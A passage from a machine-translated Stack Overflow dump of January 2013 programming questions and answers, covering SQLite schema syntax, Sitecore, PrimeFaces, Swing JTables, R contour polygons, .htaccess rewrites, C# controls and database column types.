         "CREATE TABLE " + TABLE_NAME + "(" + 
            TIMERECORDS_COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + 
            TIMERECORDS_COLUMN_TIME + " TEXT, " + 
            TIMERECORDS_COLUMN_NOTE + " TEXT);"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T13:13:36.270

这里：

```
 TIMERECORDS_COLUMN_TIME + " TEXT " + TIMERECORDS_COLUMN_NOTE + " TEXT);"; 
```

你会得到“time TEXT note TEXT”，没有逗号来分隔它们。

Sqlite 不会将其检测为语法错误：它以“无类型”数据库开始，然后添加了对*type affinity*的支持，但继续允许所有类型的垃圾用于列类型规范。

# asp.net - 从 404 重定向中删除额外的查询字符串

> ID：14379813
> 
> 赞同：3
> 
> 时间：2013-01-17T13:07:14.543
> 
> 标签：asp.net, query-string, sitecore

当请求不存在的资源时，当页面重定向到自定义 404 错误页面时，我需要从 url 中删除查询字符串，例如

`www.ourweb/non-exsiting.aspx`将被重定向到

`www.ourweb/errors/notfound.aspx?item=%2fpayments%2faccount%2fnon-existing&user=extranet\Anonymous&site=website_121_payments`

我需要从此网址中删除所有查询字符串。

最好的方法是什么？

我所做的是从`sitecore.pipelines.HttpRequest.ExecuteRequest`as创建了一个继承类

```
public class ItemNotFoundProcessor : ExecuteRequest    
{    
      protected override void RedirectOnItemNotFound(string url) 
      { 
         url = Settings.ItemNotFoundUrl; 
         base.RedirectOnItemNotFound(url); 
      } 
} 
```

并在`site.config`

```
processor type ="namespace.ItemNotFoundProcessor" 
processor type="Sitecore.Pipelines.HttpRequest.ExecuteRequest, Sitecore.Kernel" 
```

它似乎有效，但不确定它是否有任何副作用。

任何人都可以让我知道这是否是合适的解决方案。

提前致谢。

# java - cellEditor 中的 commandLink 不会触发 action/actionListener

> ID：14379815
> 
> 赞同：5
> 
> 时间：2013-01-17T13:07:23.527
> 
> 标签：java, jsf-2, primefaces

我正在使用 Primefaces 3.4 和 JSF 2.0。我有 ap:commandLink:

```
<p:commandLink action="#{wizard.onRemoveFoodItem}" update="@(#ingredientListContent)" immediate="true">
    <span class="ui-icon ui-icon-close"></span>
    <f:setPropertyActionListener target="#{wizard.selectedFoodItem}" value="#{foodItem}" />
</p:commandLink> 
```

它的目的是从我的 p:dataTable 中的食物列表中删除一行，它在正常情况下*工作。*问题在于我还想把 ap:rowEditor 放在同一个位置，对于那些熟悉 primefaces rowEditor 的人来说，在编辑时，你可以看到一个勾号和一个 x 图标（用于结束编辑模式）而且我不想有两个关闭图标，一个意思是取消编辑模式，一个意思是删除当前行。

所以我决定将它嵌入 ap:cellEditor 以便在编辑过程中隐藏删除行的“x”：

```
<p:cellEditor>   
    <f:facet name="output">  
        <p:commandLink action="#{wizard.onRemoveFoodItem}" update="@(#ingredientListContent)" immediate="true">
            <span class="ui-icon ui-icon-close"></span>
            <f:setPropertyActionListener target="#{wizard.selectedFoodItem}" value="#{foodItem}" />
        </p:commandLink> 
    </f:facet>  
    <f:facet name="input"><h:outputText value="" /></f:facet>                       
</p:cellEditor> 
```

这奇怪地发送了一个 ajax 请求并获得了一个更新响应（没有明显的验证错误），但它不会像它不在 p:cellEditor 标记内时那样调用操作方法 onRemoveFoodItem 。我知道 p:cellEditor 并不是真的要以这种方式使用，但我会假设当它可见时，它的行为就像没有 p:cellEditor 围绕它一样。

任何人都可以在这里看到任何明显的错误，或者这是 primefaces 的问题吗？如果有任何帮助，我将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-04T10:37:09.103

我有一个类似的问题，并通过将**process="@this"**属性添加到**p:commandLink**来解决它。

# sql - 结合两个不同的jTables并将按钮添加到jTable中

> ID：14379825
> 
> 赞同：0
> 
> 时间：2013-01-17T13:07:44.143
> 
> 标签：sql, swing, jtable, defaulttablemodel

我尝试使用 java swing 为论坛做。这是我的表格代码：

```
 public void SetUpJTable() {
    DefaultTableModel tableModel = (DefaultTableModel) jTable.getModel();
    String[] data = new String[4];
    db.setUp("IT Innovation Project");
    String sql = "Select topic_title,topic_description,topic_by from forumTopics WHERE topic_id = "
            + topicId + "";
    ResultSet resultSet = null;
    resultSet = db.readRequest(sql);
    try {
        while (resultSet.next()) {
            data[0] = resultSet.getString("topic_title");
            data[1] = resultSet.getString("topic_description");
            data[2] = resultSet.getString("topic_by");
            tableModel.addRow(data);        
        }
        resultSet.close();
    } catch (Exception e) {
        System.out.println(e);
    }
} 
```

我设置了这个表来检索用户从主页选择某个线程的主题详细信息。我设置了另一个表来存储用户的回复。就这个 ：

```
 public void SetUpJTableComment() {
    DefaultTableModel tableModel1 = (DefaultTableModel) jTableComment
            .getModel();
    String[] data = new String[3];
    db.setUp("IT Innovation Project");
    String sql = "Select reply_content,reply_by from forumReplies WHERE reply_topic = "
            + topicId + "";
    ResultSet resultSet = null;
    resultSet = db.readRequest(sql);
    try {
        while (resultSet.next()) {
            data[0] = resultSet.getString("reply_content");
            data[1] = resultSet.getString("reply_by");
            tableModel1.addRow(data);
        }
        resultSet.close();
    } catch (Exception e) {
        System.out.println(e);
    }
} 
```

这就是我设置表格的方式：

```
 private JTable getJTableComment() {
    String header[] = { "Comment", "Reply By" };
    if (jTableComment == null) {
        jTableComment = new JTable() {
            public boolean isCellEditable(int nRow, int nCol) {
                return false;
            }
        };
    }
    DefaultTableModel tableModel1 = (DefaultTableModel) jTableComment
            .getModel();
    tableModel1.setColumnIdentifiers(header);

    jTableComment.getColumnModel().getColumn(0).setMinWidth(700);
    jTableComment.getColumnModel().getColumn(0).setMaxWidth(800);

    jTableComment.getColumnModel().getColumn(1).setMinWidth(97);
    jTableComment.getColumnModel().getColumn(1).setMaxWidth(100);

    jTableComment.getTableHeader().setFont(
            new Font("Dialog", Font.PLAIN, 20));
    jTableComment.getTableHeader().setForeground(Color.white);
    jTableComment.getTableHeader().setBackground(new Color(102, 102, 102));
    jTableComment.setRowHeight(50);
    jTableComment.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
    jTableComment.setFont(new Font("Dialog", Font.PLAIN, 18));
    return jTableComment;
} 
```

它与两个分隔表完美配合。我想知道是否有某种方法可以将这两个表合并到一个表中？以及如何自定义表格以使其看起来不那么像表格，因为我当前的表格只是 ..solid-table 并且我的老师要求我改进它，但我不知道这样做。我试图将按钮添加到表中，但我意识到我无法从 try 语句中添加它，因为那是直接从数据库中检索数据。任何指南？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:27:45.503

您可以使用 SQL[连接](http://db.apache.org/derby/docs/10.2/ref/rrefsqlj29840.html#rrefsqlj29840)构造并拥有一个包含更多列的表：

```
select topic_title,topic_description,topic_by,
       reply_content,reply_by 
         from forumTopics join forumReplies 
           on (forumTopics.topic_id=forumReplies.topic_id)  WHERE topic_id = 1234 
```

然后像您已经在做的那样从五列结果集中构建模型。

但是如果一个论坛主题有多个回复，那么肯定会在表格中重复该主题部分。

要使表格看起来不像表格，可以试试[Swing Labs的](http://java.net/projects/swinglabs)[JTreeTable](https://stackoverflow.com/questions/4826475/using-jtreetable)，它允许有树状的子部分，这正是必需的。它不是系统库的一部分，但是您需要下载它。可以在[此处](http://www.java2s.com/Code/Java/Swing-Components/JTreeTablecomponent.htm)找到有关如何仅使用 JTreeTable 的一些源代码。

关于 JTreeTable 的外观是 Swing Labs，您可以在他们[的 web-startable demo](http://swingx.java.net/)中看到。它还自动显示代码示例。

# r - 如何将轮廓线变成填充轮廓？

> ID：14379828
> 
> 赞同：10
> 
> 时间：2013-01-17T13:08:02.067
> 
> 标签：r, contour

有谁知道转换`contourLines`多边形输出以便绘制为填充轮廓的方法，如`filled.contours`. 是否有顺序必须如何绘制多边形才能查看所有可用级别？这是一个不起作用的示例代码片段：

```
#typical plot
filled.contour(volcano, color.palette = terrain.colors)

#try
cont <- contourLines(volcano)
fun <- function(x) x$level
LEVS <- sort(unique(unlist(lapply(cont, fun))))
COLS <- terrain.colors(length(LEVS))
contour(volcano)
for(i in seq(cont)){
    COLNUM <- match(cont[[i]]$level, LEVS)
    polygon(cont[[i]], col=COLS[COLNUM], border="NA")
}
contour(volcano, add=TRUE) 
```

![在此处输入图像描述](../Images/5df9a289b7d7920d39e25d8c3b2e09e5.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-20T17:55:06.900

使用`raster`包（调用`rgeos`和`sp`）的解决方案。输出`SpatialPolygonsDataFrame`将涵盖网格中的每个值：

```
library('raster')
rr <- raster(t(volcano))
rc <- cut(rr, breaks= 10)
pols <- rasterToPolygons(rc, dissolve=T)
spplot(pols) 
```

[这是一个讨论](http://www.mail-archive.com/r-sig-geo@stat.math.ethz.ch/msg06316.html)，将向您展示如何简化（“美化”）生成的多边形。

![在此处输入图像描述](../Images/da421c25ebefe191887806de15972a11.png)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-09-19T02:07:34.670

感谢[这个](http://www.ian-ko.com/ET_SolutionCenter/gw_create_contour_polygons.htm)网站的一些灵感，我设计了一个将等高线转换为填充等高线的功能。它设置为处理栅格对象并返回 SpatialPolygonsDataFrame。

```
raster2contourPolys <- function(r, levels = NULL) {

  ## set-up levels
  levels <- sort(levels)
  plevels <- c(min(values(r), na.rm=TRUE), levels, max(values(r), na.rm=TRUE)) # pad with raster range
  llevels <- paste(plevels[-length(plevels)], plevels[-1], sep=" - ")  
  llevels[1] <- paste("<", min(levels))
  llevels[length(llevels)] <- paste(">", max(levels))

  ## convert raster object to matrix so it can be fed into contourLines
  xmin <- extent(r)@xmin
  xmax <- extent(r)@xmax
  ymin <- extent(r)@ymin
  ymax <- extent(r)@ymax
  rx <- seq(xmin, xmax, length.out=ncol(r))
  ry <- seq(ymin, ymax, length.out=nrow(r))
  rz <- t(as.matrix(r))
  rz <- rz[,ncol(rz):1] # reshape

  ## get contour lines and convert to SpatialLinesDataFrame
  cat("Converting to contour lines...\n")
  cl <- contourLines(rx,ry,rz,levels=levels) 
  cl <- ContourLines2SLDF(cl)

  ## extract coordinates to generate overall boundary polygon
  xy <- coordinates(r)[which(!is.na(values(r))),]
  i <- chull(xy)
  b <- xy[c(i,i[1]),]
  b <- SpatialPolygons(list(Polygons(list(Polygon(b, hole = FALSE)), "1")))

  ## add buffer around lines and cut boundary polygon
  cat("Converting contour lines to polygons...\n")
  bcl <- gBuffer(cl, width = 0.0001) # add small buffer so it cuts bounding poly
  cp <- gDifference(b, bcl)

  ## restructure and make polygon number the ID
  polys <- list() 
  for(j in seq_along(cp@polygons[[1]]@Polygons)) {
    polys[[j]] <- Polygons(list(cp@polygons[[1]]@Polygons[[j]]),j)
  }
  cp <- SpatialPolygons(polys)
  cp <- SpatialPolygonsDataFrame(cp, data.frame(id=seq_along(cp)))

  ## cut the raster by levels
  rc <- cut(r, breaks=plevels)

  ## loop through each polygon, create internal buffer, select points and define overlap with raster
  cat("Adding attributes to polygons...\n")
  l <- character(length(cp))
  for(j in seq_along(cp)) {
    p <- cp[cp$id==j,] 
    bp <- gBuffer(p, width = -max(res(r))) # use a negative buffer to obtain internal points
    if(!is.null(bp)) {
      xy <- SpatialPoints(coordinates(bp@polygons[[1]]@Polygons[[1]]))[1]
      l[j] <- llevels[extract(rc,xy)]
    } 
    else { 
      xy <- coordinates(gCentroid(p)) # buffer will not be calculated for smaller polygons, so grab centroid
      l[j] <- llevels[extract(rc,xy)]
    } 
  }

  ## assign level to each polygon
  cp$level <- factor(l, levels=llevels)
  cp$min <- plevels[-length(plevels)][cp$level]
  cp$max <- plevels[-1][cp$level]  
  cp <- cp[!is.na(cp$level),] # discard small polygons that did not capture a raster point
  df <- unique(cp@data[,c("level","min","max")]) # to be used after holes are defined
  df <- df[order(df$min),]
  row.names(df) <- df$level
  llevels <- df$level

  ## define depressions in higher levels (ie holes)
  cat("Defining holes...\n")
  spolys <- list()
  p <- cp[cp$level==llevels[1],] # add deepest layer
  p <- gUnaryUnion(p)
  spolys[[1]] <- Polygons(p@polygons[[1]]@Polygons, ID=llevels[1])
  for(i in seq(length(llevels)-1)) {
    p1 <- cp[cp$level==llevels[i+1],] # upper layer
    p2 <- cp[cp$level==llevels[i],] # lower layer
    x <- numeric(length(p2)) # grab one point from each of the deeper polygons
    y <- numeric(length(p2))
    id <- numeric(length(p2))
    for(j in seq_along(p2)) {
      xy <- coordinates(p2@polygons[[j]]@Polygons[[1]])[1,]
      x[j] <- xy[1]; y[j] <- xy[2]
      id[j] <- as.numeric(p2@polygons[[j]]@ID)
    }
    xy <- SpatialPointsDataFrame(cbind(x,y), data.frame(id=id))
    holes <- over(xy, p1)$id
    holes <- xy$id[which(!is.na(holes))]
    if(length(holes)>0) {
      p2 <- p2[p2$id %in% holes,] # keep the polygons over the shallower polygon
      p1 <- gUnaryUnion(p1) # simplify each group of polygons
      p2 <- gUnaryUnion(p2)
      p <- gDifference(p1, p2) # cut holes in p1      
    } else { p <- gUnaryUnion(p1) }
    spolys[[i+1]] <- Polygons(p@polygons[[1]]@Polygons, ID=llevels[i+1]) # add level 
  }
  cp <- SpatialPolygons(spolys, pO=seq_along(llevels), proj4string=CRS(proj4string(r))) # compile into final object
  cp <- SpatialPolygonsDataFrame(cp, df)
  cat("Done!")
  cp

} 
```

它可能存在一些效率低下的问题，但它在我使用测深数据进行的测试中运行良好。这是使用火山数据的示例：

```
r <- raster(t(volcano))
l <- seq(100,200,by=10)
cp <- raster2contourPolys(r, levels=l)
cols <- terrain.colors(length(cp))
plot(cp, col=cols, border=cols, axes=TRUE, xaxs="i", yaxs="i")
contour(r, levels=l, add=TRUE)
box() 
```

![在此处输入图像描述](../Images/9d077dca6c79d1c086ab696e8cee98eb.png)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-18T23:02:11.077

基于 Paul Regular 的出色工作，这里有一个版本应该确保独占多边形（即没有重叠）。

我`fd`为*仙尘*添加了一个新参数，以解决我发现使用 UTM 类型坐标的问题。基本上，据我了解，该算法通过从轮廓线中采样横向点来确定多边形*内的哪一侧。*如果样本点到线的距离最终位于例如另一个轮廓的后面，则它可能会产生问题。因此，如果您生成的多边形看起来错误，请尝试将`fd`值设置为 10^±n，直到它看起来非常错误或几乎正确..

```
raster2contourPolys <- function(r, levels = NULL, fd = 1) {
  ## set-up levels
  levels <- sort(levels)
  plevels <- c(min(values(r)-1, na.rm=TRUE), levels, max(values(r)+1, na.rm=TRUE)) # pad with raster range
  llevels <- paste(plevels[-length(plevels)], plevels[-1], sep=" - ")  
  llevels[1] <- paste("<", min(levels))
  llevels[length(llevels)] <- paste(">", max(levels))

  ## convert raster object to matrix so it can be fed into contourLines
  xmin <- extent(r)@xmin
  xmax <- extent(r)@xmax
  ymin <- extent(r)@ymin
  ymax <- extent(r)@ymax
  rx <- seq(xmin, xmax, length.out=ncol(r))
  ry <- seq(ymin, ymax, length.out=nrow(r))
  rz <- t(as.matrix(r))
  rz <- rz[,ncol(rz):1] # reshape

  ## get contour lines and convert to SpatialLinesDataFrame
  cat("Converting to contour lines...\n")
  cl0 <- contourLines(rx, ry, rz, levels = levels)
  cl <- ContourLines2SLDF(cl0)

  ## extract coordinates to generate overall boundary polygon
  xy <- coordinates(r)[which(!is.na(values(r))),]
  i <- chull(xy)
  b <- xy[c(i,i[1]),]
  b <- SpatialPolygons(list(Polygons(list(Polygon(b, hole = FALSE)), "1")))

  ## add buffer around lines and cut boundary polygon
  cat("Converting contour lines to polygons...\n")
  bcl <- gBuffer(cl, width = fd*diff(bbox(r)[1,])/3600000) # add small buffer so it cuts bounding poly
  cp <- gDifference(b, bcl)

  ## restructure and make polygon number the ID
  polys <- list()
  for(j in seq_along(cp@polygons[[1]]@Polygons)) {
    polys[[j]] <- Polygons(list(cp@polygons[[1]]@Polygons[[j]]),j)
  }
  cp <- SpatialPolygons(polys)
  cp <- SpatialPolygonsDataFrame(cp, data.frame(id=seq_along(cp)))

  # group by elev (replicate ids)
  # ids = sapply(slot(cl, "lines"), slot, "ID")
  # lens = sapply(1:length(cl), function(i) length(cl[i,]@lines[[1]]@Lines))

  ## cut the raster by levels
  rc <- cut(r, breaks=plevels)

  ## loop through each polygon, create internal buffer, select points and define overlap with raster
  cat("Adding attributes to polygons...\n")
  l <- character(length(cp))
  for(j in seq_along(cp)) {
    p <- cp[cp$id==j,] 
    bp <- gBuffer(p, width = -max(res(r))) # use a negative buffer to obtain internal points
    if(!is.null(bp)) {
      xy <- SpatialPoints(coordinates(bp@polygons[[1]]@Polygons[[1]]))[1]
      l[j] <- llevels[raster::extract(rc,xy)]
    } 
    else { 
      xy <- coordinates(gCentroid(p)) # buffer will not be calculated for smaller polygons, so grab centroid
      l[j] <- llevels[raster::extract(rc,xy)]
    }
  }

  ## assign level to each polygon
  cp$level <- factor(l, levels=llevels)
  cp$min <- plevels[-length(plevels)][cp$level]
  cp$max <- plevels[-1][cp$level]  
  cp <- cp[!is.na(cp$level),] # discard small polygons that did not capture a raster point
  df <- unique(cp@data[,c("level","min","max")]) # to be used after holes are defined
  df <- df[order(df$min),]
  row.names(df) <- df$level
  llevels <- df$level

  ## define depressions in higher levels (ie holes)
  cat("Defining holes...\n")
  spolys <- list()
  p <- cp[cp$level==llevels[1],] # add deepest layer
  p <- gUnaryUnion(p)
  spolys[[1]] <- Polygons(p@polygons[[1]]@Polygons, ID=llevels[1])
  for(i in seq(length(llevels)-1)) {
    p1 <- cp[cp$level==llevels[i+1],] # upper layer
    p2 <- cp[cp$level==llevels[i],] # lower layer
    x <- numeric(length(p2)) # grab one point from each of the deeper polygons
    y <- numeric(length(p2))
    id <- numeric(length(p2))
    for(j in seq_along(p2)) {
      xy <- coordinates(p2@polygons[[j]]@Polygons[[1]])[1,]
      x[j] <- xy[1]; y[j] <- xy[2]
      id[j] <- as.numeric(p2@polygons[[j]]@ID)
    }
    xy <- SpatialPointsDataFrame(cbind(x,y), data.frame(id=id))
    holes <- over(xy, p1)$id
    holes <- xy$id[which(!is.na(holes))]
    if(length(holes)>0) {
      p2 <- p2[p2$id %in% holes,] # keep the polygons over the shallower polygon
      p1 <- gUnaryUnion(p1) # simplify each group of polygons
      p2 <- gUnaryUnion(p2)
      p <- gDifference(p1, p2) # cut holes in p1      
    } else { p <- gUnaryUnion(p1) }
    spolys[[i+1]] <- Polygons(p@polygons[[1]]@Polygons, ID=llevels[i+1]) # add level 
  }
  cp <- SpatialPolygons(spolys, pO=seq_along(llevels), proj4string=CRS(proj4string(r))) # compile into final object

  ## make polygons exclusive (i.e. no overlapping)
  cpx = gDifference(cp[1,], cp[2,], id=cp[1,]@polygons[[1]]@ID)
  for(i in 2:(length(cp)-1)) cpx = spRbind(cpx, gDifference(cp[i,], cp[i+1,], id=cp[i,]@polygons[[1]]@ID))
  cp = spRbind(cpx, cp[length(cp),])

  ## it's a wrap
  cp <- SpatialPolygonsDataFrame(cp, df)
  cat("Done!")
  cp
} 
```

# svn - 我的 WP 插件的插件目录页面没有反映我最近的 svn 提交

> ID：14379831
> 
> 赞同：0
> 
> 时间：2013-01-17T13:08:16.597
> 
> 标签：svn, plugins, wordpress, repository

我已将我的[Image Metadata Cruncher插件的新版本](http://wordpress.org/extend/plugins/image-metadata-cruncher/)**1.5**提交到 WP 插件存储库，但 WP 插件目录的[插件页面](http://wordpress.org/extend/plugins/image-metadata-cruncher/)在几天后仍显示版本**1.4**。

 ***   稳定标签**1.5在**[README.txt](http://plugins.svn.wordpress.org/image-metadata-cruncher/trunk/README.txt)以及主干的[PHP](http://plugins.svn.wordpress.org/image-metadata-cruncher/trunk/)[主文件](http://plugins.svn.wordpress.org/image-metadata-cruncher/trunk/image-metadata-cruncher.php)中都是正确的
*   [存储库](http://plugins.svn.wordpress.org/image-metadata-cruncher/)中有一个[1.5 标记](http://plugins.svn.wordpress.org/image-metadata-cruncher/tags/1.5/)，它是主干的副本

我听说存储库每 15 分钟检查一次新版本。我什至经历过，有时消化新版本需要几个小时。但这一次持续了几天。

是 Wordpress 的 trac 问题还是我遗漏了什么？**

# android - android移动网络应用程序中的Facebook java脚本请求对话框

> ID：14379832
> 
> 赞同：0
> 
> 时间：2013-01-17T13:08:22.313
> 
> 标签：android, mobile, facebook-javascript-sdk, facebook-app-requests

我有一个 facebook 移动网络应用程序，它显示一个带有预选朋友的 apprequest 对话框，如下例所示：http: [//developers.facebook.com/docs/guides/mobile/web/#channels](http://developers.facebook.com/docs/guides/mobile/web/#channels) 使用 iPhone 时一切正常，但在 Android 中请求对话框太宽，看这个截图：[http ://screencast.com/t/oiCTlbnbAs](http://screencast.com/t/oiCTlbnbAs)

如何更改请求对话框的宽度？
我尝试了几乎所有 HTML 文档的 viewport 属性。
我的 HTML 文档是 XHTML 传统的有什么影响吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-26T22:36:26.153

如果您使用 Direct URL 方法，如下面的链接中所述，它将起作用：

[https://developers.facebook.com/docs/reference/dialogs/feed/](https://developers.facebook.com/docs/reference/dialogs/feed/)

# c# - 从另一个类调用时填充组合框

> ID：14379838
> 
> 赞同：0
> 
> 时间：2013-01-17T13:08:37.590
> 
> 标签：c#, asp.net

我对 C# 很陌生，在从另一个类调用方法时填充组合框时遇到问题。我的来源是这样的

1级

```
private void btn_login_Click(object sender, EventArgs e)
{
    UserControl1 uc1 = new UserControl1();
    uc1.fill_cbb();
} 
```

2 级

```
public void fill_cbb()
{
    cbb_table.Items.Add("Text1");
    cbb_table.Items.Add("Text2");
    cbb_table.SelectedIndex = 0;
} 
```

当我这样做时，组合框是空的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:16:51.103

如果是 Asp 请注意事件 IsPostBack

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:18:21.103

Your problem is not calling the method from another class. I suppose *UserControl1* is your custom user control, and that the "class 2" you mentioned is a userControl1.

The code would work as it is, but you are calling it on the wrong instance of that control.

In your btn_login_Click method, you are generating a totally new instance of UserControl1\. You are of course allowed to do that, which is why Visual Studio would never mark it as an error, but *uc1* will not be the control that actually sits in your form.

Let's say in your form you have named the control "cbxOptions". Then in the button click event, you have to write

> cbxOptions.fill_cbb();

instead, if that combobox is also of type UserControl1\. Then it should work just fine.

Warning, car analogy: It's like when you want a new paint job on your car. Then you buy a new car of the same model and take that to the paint shop, get it painted, then bring it to the junkyard and get it crushed. Your old car will still have the same old color of course.

# database - 数据库中的密码和手机类型

> ID：14379841
> 
> 赞同：1
> 
> 时间：2013-01-17T13:08:52.220
> 
> 标签：database, database-design

我有“客户”表：

```
CREATE TABLE Customer
(
    ID INTEGER NOT NULL DEFAULT 0,
    Username CHAR(50) NOT NULL,
    Password CHAR(100) NOT NULL,
    LastName CHAR(20) NOT NULL,
    PhoneNumber BIGINT NOT NULL,
    MobileNumber BIGINT NOT NULL,
    PRIMARY KEY (ID)
) 
; 
```

我用于`char`密码类型，对吗？而对于我使用的手机号码`bigint`，是这样吗？如果不是我该怎么办？它的 SQL 语句是什么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:30:02.183

由于这些字段都是可变长度的，因此您绝对应该使用 VARCHAR 而不是 CHAR 来表示“用户名”、“密码”和“姓氏”。如果您对这些长度有限制，那么您始终可以将 VARCHAR 类型限制为该限制。

至于“PhoneNumber”和“MobileNumber”，您不会使用这些值执行任何计算，因此没有理由不将它们存储为 VARCHAR，更不用说电话号码通常包含 0 作为第一个字符，而不能存储为任何类型的 INT。

就像是：

```
CREATE TABLE `Customer` (
 `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
 `Username` varchar(255) NOT NULL DEFAULT '',
 `Password` varchar(255) NOT NULL DEFAULT '',
 `LastName` varchar(255) NOT NULL DEFAULT '',
 `PhoneNumber` varchar(100) DEFAULT NULL,
 `MobileNumber` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:19:04.160

All these questions matter on the requirements that you have...for example

You can use `BIGINT` for the `MobileNumber` if there are only going to be numbers in this field.
You will use `VARCHAR` if there can also be characters in it.

Both `VARCHAR` and `CHAR` have their own advantages and disadvantages.
Using `VARCHAR` gives you the freedom to have as many characters as you like in a single string,

For example `VARCHAR(30)` can store upto 30 characters, and if there are less characters in it, then the rest memory is dumped automatically. You can also use `VARCHAR(max)` for this purpose, it will use all the characters passed and then dump the rest of the memory
`CHAR(30)` will also store 30 characters but it will not take care of the memory.

Memory may not be the issue in a smaller programs, but it can make significant effect if the program is huge.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T15:50:51.250

^(对于密码，使用字节1)的数组并存储密码的单向**哈希**。当需要验证用户输入的密码时，对其进行散列并将其与存储的散列进行比较。

最重要的是，您还应该使用[加盐](http://en.wikipedia.org/wiki/Salt_%28cryptography%29)和（理想情况下）将整个身份验证基础设施与防火墙和定义明确的 API 之外的自己的服务器分开。

相关答案：

*   [加密数据库密码字段的必要性](https://stackoverflow.com/a/12538258/533120)
*   [存储用户并传入单个表或单独的表](https://stackoverflow.com/a/13326205/533120)

* * *

¹ `RAW`在 Oracle、`bytea`PostgreSQL、`varbinary`MS SQL Server、`BLOB`MySQL 等中...

# php - 为什么如果我在我的 htaccess 规则中添加“-”破折号不起作用？

> ID：14379842
> 
> 赞同：4
> 
> 时间：2013-01-17T13:09:00.847
> 
> 标签：php, apache, .htaccess, mod-rewrite, url-rewriting

我有以下规则，一个“我们的商店”重定向到与其他“PLAIN PAGES”规则不同的地方：

```
 Options +FollowSymlinks
    RewriteEngine on
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d

    RedirectMatch 302 /construction.html http://www.{website}.com/construction-services
    RedirectMatch 302 /construction/endless-pools.html http://www.{website}.com/construction-services/endless-pools

    # PRODUCT AND SERVICES
    RewriteCond %{REQUEST_URI} !\.html$
    RewriteRule ^(.*)/(.*)$ /rewrite.php?sub=$1&second=$2 [NC]

    # PLAIN PAGES
    #RewriteRule ^/$ /index.php [L,NC]
    RewriteRule ^signup-free$ /signup-free.php [L,NC]
    RewriteRule ^about$ /content.php?page=1 [L,NC]
    RewriteRule ^links$ /content.php?page=2 [L,NC]
    RewriteRule ^portfolio$ /portfolio.php [L,NC]
    RewriteRule ^our-stores$ /our-stores.php [L,NC]
    RewriteRule ^contact$ /contact.php [L,NC]
    RewriteRule ^products-list$ /lists.php?action=products [L,NC]
    RewriteRule ^services-list$ /lists.php?action=services [L,NC] 
```

当我键入`/our-stores`apache 重定向到：`/our-stores/?sub=our-stores&second=`

我不明白，因为其余的（免注册、关于、链接、投资组合......等等）工作正常。

有人可以帮我解决这个问题吗？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:19:12.193

通用规则已移至底部，`REQUEST_FILENAME`条件移至静态重定向下方。此外，我添加了 a`/?`以匹配每个特定重定向上的可选尾部斜杠。最后，通用规则被改进为不使用`.*`，而是以`/`不那么贪婪的方式将所有内容匹配到第一个。然后它`.+`在之后使用`/`以确保至少存在一个字符。因此，带有斜杠的 URL 将不匹配它。如果您有一些没有 的泛型`second=`，请改回`.*`.

所有这些都在 htaccess 测试器中正常工作。

```
RedirectMatch 302 /construction.html http://www.{website}.com/construction-services
RedirectMatch 302 /construction/endless-pools.html http://www.{website}.com/construction-services/endless-pools

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

RewriteRule ^signup-free/?$ /signup-free.php [L,NC]
RewriteRule ^about/?$ /content.php?page=1 [L,NC]
RewriteRule ^links/?$ /content.php?page=2 [L,NC]
RewriteRule ^portfolio/?$ /portfolio.php [L,NC]
RewriteRule ^our-stores/?$ /our-stores.php [L,NC]
RewriteRule ^contact/?$ /contact.php [L,NC]
RewriteRule ^products-list/?$ /lists.php?action=products [L,NC]
RewriteRule ^services-list/?$ /lists.php?action=services [L,NC]

# PRODUCT AND SERVICES
RewriteCond %{REQUEST_URI} !\.html$
RewriteRule ^([^/]+)/(.+)$ /rewrite.php?sub=$1&second=$2 [NC] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:15:21.770

我怀疑您有一个名为`our-stores`.

这将触发`RewriteCond %{REQUEST_FILENAME} !-d`，导致它不重写。

然后它会尝试从该目录（例如 index.php）加载不存在的默认页面，因此它会尝试重写该默认页面，从而导致`?sub=our-stores&second=`添加参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:11:24.247

符号“-”是正则表达式中的特殊字符。它定义了一个范围（az、à-9 等）。

试着逃避它。

```
RewriteRule ^our\-stores$ /our-stores.php [L,NC] 
```

# scala - GroupBy 具有共享索引或 Play 2 重复形式

> ID：14379844
> 
> 赞同：0
> 
> 时间：2013-01-17T13:09:01.770
> 
> 标签：scala, functional-programming, playframework-2.0

我正在尝试使用 Play 2 和 Scala 制作订单。

这是分组前的样子：

```
<table>
  @items.zipWithIndex.map {
    case (item, index) =>
      @itemRow(item, index)
  }
</table> 
```

itemRow 定义

```
@itemRow(index: Int, item: Item) = {
    <tr>
        <td>
        @(index+1)
        </td>
        <td>
        @item.name
        </td>
        <td>
            <input type="hidden" name="@requestForm("items")("[" + index + "]")("itemId").name" value="@item.id">
            <input type="text" name="items[@index].count" value="@requestForm("items")("[" + index + "]")("count").value">

        </td>
    </tr>
} 
```

起初我尝试了幼稚的实现

```
@items.groupBy(item => item.category).map {
  case (categoryId, itemsInCategory) =>
    <table>
      @itemsInCategory.zipWithIndex.map {
        case (item, index) =>
          @itemRow(item, index)
      }
    </table>
} 
```

但是有一个问题，每个类别的索引都是从 0 开始的。

所以，http请求是这样的：

```
# category 1
